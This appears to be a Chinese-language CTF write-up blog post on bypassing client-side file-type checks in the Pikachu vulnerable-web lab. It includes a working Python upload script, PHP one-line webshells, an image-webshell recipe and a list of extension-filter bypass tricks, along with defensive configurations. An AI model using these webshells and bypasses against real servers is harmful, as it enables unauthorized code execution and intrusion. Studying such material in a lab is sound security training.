---
layout: post
title: Pikachu - Unsafe Fileupload client check Writeup（前端校验为什么不可靠）
platform: pikachu
date: 2026-10-29 20:20:00 +0800
categories: CTF
---

Pikachu - Unsafe Fileupload client check Writeup（前端校验为什么不可靠）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Unsafe Fileupload → client check
- 地址：`http://localhost/pikachu/vul/unsafeupload/clientcheck.php`
- 题型：Web
- 考点：**前端校验绕过**、文件上传 getshell

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
上传目录：D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\
访问 URL：http://localhost/pikachu/vul/unsafeupload/uploads/<文件名>
```

**页面形态**：

```text
这里只允许上传图片o!

[选择文件] 未选择文件
[开始上传]
```

**作者提示**：

```html
data-content="一切在前端做的安全措施都是不靠谱的"
```

**★ 这句话就是本关的全部答案。**

**✅ 实测结果**

| 步骤 | 结果 |
|---|---|
| ① 直接 POST 上传 `test_upload.php`（不经过 JS）| **`文件上传成功`，路径 `uploads/test_upload.php`** ✅ |
| ② 访问上传后的文件 | **HTTP 200，101 字节** ✅ |
| ③ 页面内容 | **`UPLOAD_RCE_OK \| php=7.3.4 \| self=D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\test_upload.php`** |
| ④ 正常上传 1x1 PNG（对照）| 成功，`uploads/probe1x1.png` |

**★ 第 ③ 行说明**：

```
UPLOAD_RCE_OK      ← 我写的 echo 执行了
php=7.3.4          ← 能调用 PHP 函数
self=D:\...\test_upload.php   ← __FILE__ 泄露了绝对路径

★ 上传的 PHP 文件被【当代码执行】了
★ 从"上传文件"到"代码执行"，只用了两步
```

二、题目分析

**① 前端校验的代码（唯一的"防护"）**

```html
<!-- clientcheck.php 第 55-57 行 -->
<form class="upload" method="post" enctype="multipart/form-data" action="">
    <input class="uploadfile" type="file" name="uploadfile" onchange="checkFileExt(this.value)" />
                                                   └──────────┬──────────┘
                                            ★ 只在"选中文件时"触发
    <input class="sub" type="submit" name="submit" value="开始上传" />
</form>
```

```javascript
// clientcheck.php 第 71-95 行
function checkFileExt(filename) {
    var flag = false;
    var arr = ["jpg", "png", "gif"];          // ★ 白名单（在前端）
    var index = filename.lastIndexOf(".");
    var ext = filename.substr(index + 1);     // 取扩展名

    for (var i = 0; i < arr.length; i++) {
        if (ext == arr[i]) { flag = true; break; }
    }

    if (!flag) {
        alert("上传的文件不符合要求，请重新选择！");
        location.reload(true);                // ★ 只是"刷新页面"
    }
}
```

**★ 这段 JS 看着挺严谨**：

```
· 白名单（不是黑名单）
· 取最后一个点之后的扩展名
· 不通过就弹窗 + 刷新
```

**★ 但它在浏览器里跑 → 攻击者可以完全跳过它。**

**② 服务端的代码（关键：什么都没检查）**

```php
<?php
// clientcheck.php 第 18-27 行
if(isset($_POST['submit'])){
    $save_path = 'uploads';                            // 在当前目录建 uploads
    $upload = upload_client('uploadfile', $save_path);  // ★ 调用上传函数
    if($upload['return']){
        $html .= "<p class='notice'>文件上传成功</p>
                  <p class='notice'>文件保存的路径为：{$upload['new_path']}</p>";
    }else{
        $html .= "<p class=notice>{$upload['error']}</p>";
    }
}
?>
```

```php
<?php
// inc/uploadfunction.php — upload_client()
function upload_client($key, $save_path) {
    // ① 只检查 $FILES 的 error 码（文件太大 / 没选文件 之类）
    if(!isset($_FILES[$key]['error'])){ ... return; }
    if($_FILES[$key]['error'] != 0){ ... return; }

    // ② 创建目录
    if(!file_exists($save_path)){
        if(!mkdir($save_path, 0777, true)){ ... return; }
    }
    $save_path = rtrim($save_path, '/') . '/';

    // ③ ★ 直接 move，用【原始文件名】保存，没有任何扩展名检查
    if(!move_uploaded_file($_FILES[$key]['tmp_name'], $save_path . $_FILES[$key]['name'])){
        ... return;
    }

    $return_data['new_path'] = $save_path . $_FILES[$key]['name'];
    $return_data['return']   = true;
    return $return_data;
}
?>
```

**★ 服务端做的事只有三件**：

```
① 检查上传错误码（有没有文件、大小是否超过 php.ini 限制）
② 创建目录
③ move_uploaded_file(临时文件, 目标目录 + 原始文件名)
```

**★ 完全没有**：

```
❌ 没有检查后缀
❌ 没有检查 MIME 类型
❌ 没有检查文件内容（getimagesize）
❌ 没有重命名
❌ 没有限制目录执行
```

**★ 所以 "前端的白名单" 和 "后端的零校验" 形成了巨大落差**：

```
前端：只允许 jpg/png/gif
后端：你说是啥就是啥
★ 只要绕过前端，后端完全敞开
```

**③ ⭐ 为什么"前端校验"不可靠（核心认知）**

**★ 三层原因**：

```
① JS 跑在【浏览器】里 → 用户完全控制浏览器
② 请求是【自己构造】的 → 根本不经过浏览器
③ 攻击者用 Burp / curl / Python → JS 一行都不会执行
```

**★ 五种绕过方式（从易到难）**：

| # | 方式 | 做法 |
|---|---|---|
| 1 | **直接发请求**（最简单）| Python / curl / Burp 构造 multipart POST |
| 2 | **F12 覆盖 JS 函数** | 控制台里 `function checkFileExt(f){return true;}` |
| 3 | **F12 删属性** | 元素面板删掉 `onchange="checkFileExt(...)"` |
| 4 | **禁用 JavaScript** | 浏览器设置里关掉 JS |
| 5 | **改名 + 抓包改回** | 文件叫 `1.jpg` 过 JS，抓包把 filename 改回 `1.php` |

**★ 本关我用的就是方式 1**：

```python
body = (
    b'--BOUNDARY\r\n'
    b'Content-Disposition: form-data; name="submit"\r\n\r\n'
    '开始上传'.encode() + b'\r\n'
    b'--BOUNDARY\r\n'
    b'Content-Disposition: form-data; name="uploadfile"; filename="test_upload.php"\r\n'
    b'Content-Type: application/octet-stream\r\n\r\n'
    + content + b'\r\n'
    b'--BOUNDARY--\r\n'
)
```

**★ 注意这一行**：

```
filename="test_upload.php"
         └──────┬──────┘
   ★ 这是"请求里写的文件名"，不是"磁盘上的文件名"
   ★ 两者可以不同！（磁盘上是 a.txt，请求里写 a.php）
   
★ JS 检查的是"用户选的那个文件的名字"
★ 但真正发给服务器的，是"请求里的 filename 字段"
★ 攻击者可以直接写任何名字
```

**④ "上传 getshell"的两个必要条件**

**★ 光能传上去还不够，必须同时满足**：

```
条件 1：能【写】到服务器上
    · 有上传功能
    · 上传目录可写
    · 路径可预测（知道传上去的文件在哪）

条件 2：能【执行】或【访问】
    · 上传目录在 Web 根目录下 → 能用 URL 访问
    · 服务器把 .php 解析执行 → 代码跑起来
    · 或者配合 LFI，把上传的文件"包含"进来执行
```

**★ 本关两个条件都满足**：

```
① 上传目录 = D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\
   ★ 在 Web 根目录（WWW）下 → 能 URL 访问
   
② 服务器把 .php 当 PHP 执行
   ★ Apache + PHP 的标准行为
   
→ 传上去 → 访问 → 执行 ✅
```

**★ 如果只有一个条件**：

```
只有"能写"没有"能执行"：
    · 上传目录不在 Web 根目录 → 访问不到
    · 或者配置了"上传目录禁止执行 PHP" → 访问到也不执行
    → 这时要配合 LFI（文件包含），把上传的文件"包含"进来
    
只有"能执行"没有"能写"：
    · 没有上传功能 → 这条路走不通
```

**⑤ 一个"副产品"发现：上传的文件删不掉**

**★ 测试完想清理，结果报"访问被拒绝"**：

```
Remove-Item : 无法删除项 ...\uploads\test_upload.php: 对路径的访问被拒绝。
```

**★ 查权限**：

```
Owner : BUILTIN\Administrators          ← ★ 所有者是管理员组
BUILTIN\Users              -> ReadAndExecute      ← 普通用户只能读
BUILTIN\Administrators     -> FullControl
NT AUTHORITY\SYSTEM        -> FullControl

当前用户：cecilia（是否管理员: False）
→ 删不掉，必须用管理员权限
```

**★ 为什么**：

```
phpstudy 的 Apache 是以"高权限"跑的
→ move_uploaded_file 创建的文件，所有者是 Administrators
→ cecilia 只有 ReadAndExecute
```

**★ 这个现象其实很有教学意义**：

```
它从侧面说明"Web 服务的权限应该尽量低"
    · 高权限 → 上传的文件也归高权限所有
    · 一旦 getshell → 攻击者拿到高权限
    · 低权限 → 攻击者只能做到"Web 用户能做的"
    
★ 生产环境会把 Apache/Nginx 跑成 nobody/www-data
★ 并且"上传目录只写不执行"
```

三、解题步骤

**第 1 步：体验"前端拦截"**

```text
① 打开 http://localhost/pikachu/vul/unsafeupload/clientcheck.php
② 点"选择文件"，随便选一个 .txt 或 .php
③ 立刻弹出："上传的文件不符合要求，请重新选择！"
④ 页面自动刷新
```

**★ 这就是"前端校验" —— 看起来拦住了。**

**第 2 步：⭐ 方式 A —— F12 覆盖 JS（最快）**

**★ 打开 F12 控制台，跑这两行**：

```javascript
// ① 覆盖检查函数（永远放行）
function checkFileExt(filename) { return true; }

// ② 或者直接删掉 onchange 属性
document.querySelector('input[type=file]').removeAttribute('onchange');
```

**★ 然后正常选一个 `.php` 文件上传。**

**第 3 步：⭐ 方式 B —— 改名 + 抓包改回（Burp）**

```text
① 准备一个 1.php（内容：<?php echo "OK"; ?>）
② 把文件改名成 1.jpg（这样 JS 会放行）
③ 选择 1.jpg → 点"开始上传"
④ Burp 抓包，找到：
       Content-Disposition: form-data; name="uploadfile"; filename="1.jpg"
   改成：
       Content-Disposition: form-data; name="uploadfile"; filename="1.php"
⑤ Forward
⑥ 响应："文件上传成功，路径为：uploads/1.php"
```

**第 4 步：⭐ 方式 C —— 直接用 Python（不用浏览器）**

```python
import uuid
import urllib.request

URL = "http://localhost/pikachu/vul/unsafeupload/clientcheck.php"
CONTENT = b'<?php echo "UPLOAD_RCE_OK | php=".phpversion(); ?>'

b = "----Boundary" + uuid.uuid4().hex[:12]
body  = ("--%s\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n开始上传\r\n" % b).encode()
body += ("--%s\r\nContent-Disposition: form-data; name=\"uploadfile\"; "
         "filename=\"probe.php\"\r\nContent-Type: application/octet-stream\r\n\r\n" % b).encode()
body += CONTENT + b"\r\n"
body += ("--%s--\r\n" % b).encode()

req = urllib.request.Request(
    URL, data=body, method="POST",
    headers={"Content-Type": "multipart/form-data; boundary=" + b}
)
print(urllib.request.urlopen(req).read().decode("utf-8", "replace"))
```

**★ 实测输出**：

```html
<p class='notice'>文件上传成功</p>
<p class='notice'>文件保存的路径为：uploads/probe.php</p>
```

**第 5 步：⭐ 访问上传的文件（验证执行）**

**★ 地址栏访问**：

```
http://localhost/pikachu/vul/unsafeupload/uploads/probe.php
```

**★ 实测结果**：

```
UPLOAD_RCE_OK | php=7.3.4 | self=D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\test_upload.php
```

**★ 到这里，"文件上传 getshell"的验证就完成了。**

**★ 想更进一步（真正 getshell）**：

```php
<?php @eval($_POST['cmd']); ?>
```

**★ 然后用蚁剑连接 `http://localhost/.../uploads/shell.php`，密码 `cmd`。**

**★ 但这次练习建议停在这里**：

```
· 我们只需要"证明 PHP 能执行"（echo 就够了）
· 不要真的留一个"能执行任意代码"的后门在自己硬盘上
· 而且文件所有者是 Administrators → 删的时候还要管理员权限
```

**第 6 步：清理（需要管理员）**

**★ 普通 PowerShell 会"访问被拒绝"**，必须用管理员：

```powershell
# 以管理员身份打开 PowerShell
Remove-Item "D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\*" -Force
```

**★ 或者先"抢所有权"再删**：

```powershell
takeown /F "D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads" /R /D Y
icacls "D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads" /grant cecilia:F /T
Remove-Item "D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\*" -Force
```

**第 7 步：完整 payload 汇总**

```php
// ========== 探针（验证能执行，无害）==========
<?php echo "UPLOAD_RCE_OK | php=".phpversion()." | self=".__FILE__; ?>

// ========== 一句话木马（getshell，慎用）==========
<?php @eval($_POST['cmd']); ?>
<?php @eval($_POST[1]); ?>
<?php assert($_POST['cmd']); ?>          (PHP 7 之前)

// ========== 图片马（配合 LFI 用）==========
（PNG 文件头）+ <?php @eval($_POST['cmd']); ?>
```

**★ 上传后的路径**：

```
uploads/<你请求里写的 filename>
└──────┬──────┘
  固定在 uploads 目录下，文件名完全由你控制
```

四、延伸知识

**① 文件上传漏洞的完整分类（本模块 7 关的路线图）**

**★ Pikachu 的 7 关覆盖了"上传校验的演进"**：

| # | 关卡 | 校验方式 | 绕过思路 |
|---|---|---|---|
| 1 | **client check**（本关）| 前端 JS | **直接发请求** |
| 2 | MIME type | 服务端查 `$_FILES['type']` | **伪造 Content-Type** |
| 3 | getimagesize | 服务端查"是不是真图片" | **图片马（图片 + PHP）** |
| 4 | 后缀黑名单 | 服务端查"不能是什么" | **大小写 / 双写 / 点空格** |
| 5 | 后缀白名单 | 服务端查"必须是什么" | **配合解析漏洞 / %00** |
| 6 | 二次渲染 | 图片被重写 | **在保留的元数据里藏代码** |
| 7 | 条件竞争 | 先传后删 | **在删除前访问** |

**★ 演进逻辑**：

```
前端校验        → 一戳就破（本关）
MIME 校验       → 伪造请求头就破
getimagesize    → 做"图片马"就破
后缀黑名单      → 变形后缀就破
后缀白名单      → 需要"解析漏洞"配合
二次渲染        → 需要"在图片里藏代码"
条件竞争        → 需要"时间窗口"
```

**② 绕过后缀检查的"技巧大全"**

**★ 虽然是后面几关的内容，先列出来有个印象。**

**技巧 1：大小写**

```
shell.PHP / shell.PhP / shell.pHp
★ Windows 不区分大小写 → .PHP 也能执行
★ 但黑名单里只写了 .php → 漏掉
```

**技巧 2：双写**

```
shell.pphphp       （删掉中间的 php 后 → shell.php）
shell.pHp          （大小写）
```

**技巧 3：点 + 空格（Windows 特有）**

```
shell.php.         → Windows 会忽略结尾的点和空格 → 实际是 shell.php
shell.php （空格）  → 同上
★ 黑名单检查的是 "shell.php."，不等于 "shell.php" → 放行
```

**技巧 4：`::$DATA`（Windows NTFS 数据流）**

```
shell.php::$DATA   → 实际创建 shell.php
★ 黑名单匹配 "::$DATA" 结尾 → 不拦
```

**技巧 5：`%00` 截断（PHP < 5.3.4）**

```
shell.php%00.jpg
→ 保存时 %00 截断 → 变成 shell.php
★ 现代 PHP 已修复
```

**技巧 6：`/.` 结尾（某些配置）**

```
shell.php/.        → 有些系统会规范化成 shell.php
```

**技巧 7：其他可执行后缀**

```
.php3 .php4 .php5 .phtml .pht .phar .inc
★ 取决于 Apache 的 AddType 配置
★ 默认情况下 .php5/.phtml 往往也能执行
```

**★ 本环境实测过**（Pikachu 的 httpd.conf 里）：

```
AddType application/x-httpd-php .php .phtml .php3 ...
★ 所以 .phtml 也能执行（这是"后缀黑名单"那关的关键）
```

**③ 图片马：怎么让"图片"里藏代码**

**★ 最简单的做法（追加）**：

```powershell
# 把 PHP 代码追加到一个正常 PNG 后面
Get-Content shell.php -Raw | Add-Content -Path normal.png -Encoding utf8
```

**★ 结果**：

```
normal.png = [PNG 文件头 + 图片数据] + <?php @eval($_POST['cmd']); ?>
```

**★ 为什么能成**：

```
· getimagesize() 只看文件头 → 判定"是 PNG" ✅
· include/执行时，PHP 会扫描全文的 <?php ... ?> → 找到并执行 ✅
★ 两个检查看的东西不一样 → 图片马能同时满足
```

**★ 用法**：

```
① 上传图片马（能过 getimagesize 检查）
② 用 LFI 包含它：?filename=../../uploads/normal.png
③ 代码被执行
★ 这就是"上传 + 包含"的经典组合
```

**④ 判断"上传成功但执行不了"的原因**

**★ 常见四种情况**：

**情况 1：上传目录不在 Web 根目录**

```
D:\phpstudy_pro\uploads\          ← 不在 WWW 下
→ http://target/uploads/shell.php 访问不到
→ 只能配合 LFI
```

**情况 2：上传目录禁止执行 PHP**

```nginx
location ^~ /uploads/ {
    location ~ \.php$ { deny all; }
}
```

**★ 这是"最正确的防御"**：

```
文件能传、能下载，但不会被当代码执行
★ 传上去的 shell 只是一个"内容为 PHP 源码的文本文件"
```

**情况 3：文件名被重命名**

```php
$new_name = md5(uniqid()) . '.jpg';       // 强制改后缀
move_uploaded_file($tmp, $dir . $new_name);
★ 你不知道文件名 → 但响应里可能告诉你
★ 或者用"条件竞争"在改名之前访问
```

**情况 4：文件权限不对**

```
上传目录的属主是 root，Apache 是 www-data
→ move_uploaded_file 失败 → 根本传不上去
```

**⑤ 防御（五层）**

**❌ 本关的反面教材**：

```html
<input type="file" onchange="checkFileExt(this.value)" />   <!-- 前端检查 -->
```
```php
move_uploaded_file($tmp, $dir . $_FILES['f']['name']);      <!-- 后端零校验 -->
```

**✅ 第 1 层：前端校验（有比没有好，但不能当防护）**

```javascript
// 只作为"用户体验"（提前告诉用户"只能传图片"）
// ★ 绝对不能作为安全措施
```

**✅ 第 2 层：服务端校验扩展名（白名单）**

```php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed, true)) {
    die('只允许上传图片');
}
```

**✅ 第 3 层：服务端校验内容（getimagesize）**

```php
$info = @getimagesize($_FILES['f']['tmp_name']);
if ($info === false || !in_array($info[2], [IMAGETYPE_JPEG, IMAGETYPE_PNG, IMAGETYPE_GIF])) {
    die('不是合法的图片');
}
```

**★ 注意**：

```
getimagesize 能防住"纯 PHP 文件"，但防不住"图片马"
★ 必须配合"上传目录禁止执行"才能根治
```

**✅ 第 4 层：重命名 + 打散目录**

```php
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
$save_dir = '/data/uploads/' . date('Y/m/d/');       // 按日期分目录
move_uploaded_file($tmp, $save_dir . $new_name);
```

**★ 好处**：

```
· 攻击者猜不到文件名 → 无法访问
· 即使传上去了，也不知道 URL
```

**✅ 第 5 层：上传目录禁止执行（最关键）**

**Nginx**：

```nginx
location ^~ /uploads/ {
    location ~ \.php$ { deny all; }
}
```

**Apache**：

```apache
<Directory "/var/www/html/uploads">
    php_admin_flag engine off
    <FilesMatch "\.(php|phtml|php3|php4|php5)$">
        Require all denied
    </FilesMatch>
</Directory>
```

**★ 这一层能"一票否决"上传 getshell**：

```
即使前面所有检查都被绕过
即使 shell.php 真的传上去了
→ 访问它时，服务器不把它当 PHP 执行
→ 只是一段"内容为 PHP 源码的文本"
★ 攻击者的 getshell 失败
```

**⑥ 文件上传在真实世界的地位**

**★ 它是"getshell 最常见的方式"**：

```
· 比 RCE 更常见（很多系统没有 sys 命令执行点）
· 比 SQL 注入更"直接"（一步到代码执行）
· 比文件包含更"可控"（你自己决定传什么）
```

**★ 真实案例**：

```
· 某 CMS 的头像上传能传 .php → getshell
· 某 OA 的附件上传只查 Content-Type → 改包就绕过
· 某网盘"上传图片"用 getimagesize → 图片马 + LFI
· 某次 HW 中，"上传 + 解析漏洞"是最常见的入口
```

**★ 所以"文件上传"是渗透测试的重点检查项**：

```
① 找所有上传点（头像、附件、导入、模板）
② 试传 .php / .phtml / .php5
③ 抓包改 Content-Type
④ 做图片马
⑤ 看上传目录能不能 URL 访问
⑥ 看能不能执行
```

五、总结

- **本题核心：前端 JS 检查扩展名，但服务端 `move_uploaded_file` 完全没校验 → 直接发请求就能上传任意文件并执行。**

- **两段关键代码**：

```javascript
// 前端（唯一的"防护"）
var arr = ["jpg", "png", "gif"];
if (ext == arr[i]) { flag = true; }
// ★ 在浏览器里跑 → 可被完全跳过
```

```php
// 后端（零校验）
move_uploaded_file($_FILES[$key]['tmp_name'], $save_path . $_FILES[$key]['name']);
// ★ 用原始文件名保存，不检查后缀、MIME、内容
```

- **⭐ 八个必记要点**：

```text
① 前端校验不可靠（本关核心）
   JS 跑在浏览器 → 用户可以禁用 / 覆盖 / 直接绕过
   ★ 作者提示："一切在前端做的安全措施都是不靠谱的"

② 请求里的 filename 是"你自己写的"
   磁盘上是 a.txt，请求里可以写 a.php
   ★ JS 检查的是"磁盘上的名字"，服务器用的是"请求里的名字"

③ 上传 getshell 的两个必要条件
   ① 能写到服务器（且有可访问的路径）
   ② 服务器会执行（.php 被解析）
   ★ 缺一个都不行

④ 本关两个条件都满足
   uploads 在 Web 根目录下 → 能 URL 访问
   Apache 把 .php 当 PHP → 能执行

⑤ 上传的文件可能删不掉
   phpstudy 的 Apache 高权限跑 → 文件所有者是 Administrators
   ★ 清理要用管理员 PowerShell

⑥ 上传漏洞的 7 种校验（本模块路线图）
   前端 → MIME → getimagesize → 黑名单 → 白名单 → 二次渲染 → 条件竞争
   ★ 一层比一层难绕过

⑦ 图片马是"过 getimagesize"的标准手法
   [PNG 头 + 图片数据] + <?php ... ?>
   ★ getimagesize 看文件头，PHP 看全文标签
   ★ 必须配合"上传目录可执行"或"LFI 包含"

⑧ 最有效的防御：上传目录禁止执行
   nginx: location ^~ /uploads/ { location ~ \.php$ { deny all; } }
   ★ 这一条能让"上传 getshell"直接失败
```

- **实测数据**：

```text
直接 POST 上传 test_upload.php：
    响应 → 文件上传成功 / 路径 uploads/test_upload.php

访问 http://localhost/pikachu/vul/unsafeupload/uploads/test_upload.php：
    HTTP 200，101 字节
    UPLOAD_RCE_OK | php=7.3.4 | self=D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\test_upload.php

正常上传 1x1 PNG：
    成功 → uploads/probe1x1.png

清理时遇到权限问题：
    Owner: BUILTIN\Administrators
    cecilia 只有 ReadAndExecute → 需管理员权限删除
```

- **进度**：

```text
platform: pikachu   32 篇

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
└── Unsafe Fileupload   1/7    ← 客户端校验完成，还剩 6 关
```

**手工复现要点**：

```text
· 选一个 .txt 上传 → 前端弹窗"不符合要求"
· F12 控制台跑：function checkFileExt(f){return true;}
· 再选 .php 上传 → 成功
· 或者用 Python 直接发 multipart POST（绕过整个浏览器）
· 访问 uploads/xxx.php → 看到 PHP 执行结果
· 用管理员 PowerShell 清理 uploads 目录
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  前端校验 = 广告，不是防护                                     │
│                                                            │
│  浏览器的 JS 检查                                          │
│      → 禁用 JS / 覆盖函数 / 直接发请求 → 全绕过               │
│                                                            │
│  上传 getshell 两个条件：                                     │
│      ① 能写（上传目录可写 + 路径可访问）                       │
│      ② 能执行（.php 被解析，或配合 LFI）                      │
│                                                            │
│  ★ 请求里的 filename 是攻击者自己写的，和磁盘文件名无关          │
│  ★ 最有效防御：上传目录禁止执行 PHP                            │
│  ★ 其次：白名单 + getimagesize + 重命名 + 分目录                │
└────────────────────────────────────────────────────────────┘
```
